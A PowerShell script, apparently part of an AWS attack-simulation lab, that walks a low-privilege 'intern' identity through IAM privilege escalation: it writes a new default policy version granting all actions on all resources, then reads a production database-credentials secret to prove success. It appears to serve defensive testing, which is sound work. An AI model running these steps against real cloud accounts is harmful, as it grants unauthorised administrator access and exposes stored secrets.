# Scenario 1: IAM privilege escalation via iam:CreatePolicyVersion
# ATT&CK: T1580 (discovery), T1098.003 (escalation)
. "$PSScriptRoot\common.ps1"

$PolicyArn = Tf-Out intern_policy_arn
Use-Identity intern

Log 'Step 1: Who am I?'
$null = Attempt sts get-caller-identity

Log 'Step 2: Recon my own permissions'
$null = Attempt iam list-attached-user-policies --user-name lab-intern
$null = Attempt iam list-policy-versions --policy-arn $PolicyArn

Log "Step 3: Confirm I can't read secrets yet"
if ($null -ne (Get-Aws secretsmanager list-secrets)) {
  Warn 'Intern can already list secrets before escalation. Is IAM enforcement on? Run .\windows\preflight.ps1'
}

Log 'Step 4: Write a new default version of my policy granting *:*'
$AdminDoc = [IO.Path]::GetTempFileName()
# WriteAllText emits UTF-8 without a BOM; the AWS CLI rejects a BOM in file:// JSON.
[IO.File]::WriteAllText($AdminDoc, '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}')
$created = Attempt iam create-policy-version --policy-arn $PolicyArn --policy-document "file://$AdminDoc" --set-as-default
Remove-Item $AdminDoc -ErrorAction SilentlyContinue
if (-not $created) { Finish blocked }

Start-Sleep -Seconds 2
Log 'Step 5: Prove escalation by reading the crown-jewel secret'
if (Attempt secretsmanager get-secret-value --secret-id 'lab/prod/db-credentials' --query SecretString --output text) {
  Finish succeeded
}
Finish blocked
